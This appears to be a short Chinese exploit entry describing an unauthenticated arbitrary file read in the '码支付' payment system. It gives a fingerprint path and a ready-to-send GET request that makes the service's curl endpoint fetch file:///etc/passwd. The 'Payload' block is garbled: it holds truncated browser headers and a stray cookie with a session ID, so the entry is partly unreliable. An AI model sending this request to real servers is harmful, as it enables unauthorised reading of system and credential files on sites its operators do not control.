# 码⽀付存在前台Service任意⽂件读取漏洞

码⽀付 ｜ 其他 ｜ —
- **指纹**：`"/epaydoc/epaydoc.php"`
- **请求**：`GET /pay/service/curl?url=file:///etc/passwd HTTP/1.1`

**Payload**
```
KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Cookie: su_webp=1; wp-settings-1=libraryContent%3Dbrowse; wp-settings-time
-1=1734956910; PHPSESSID=svast3da23vf6s8brt44ddbni9
```
- **响应特征**：200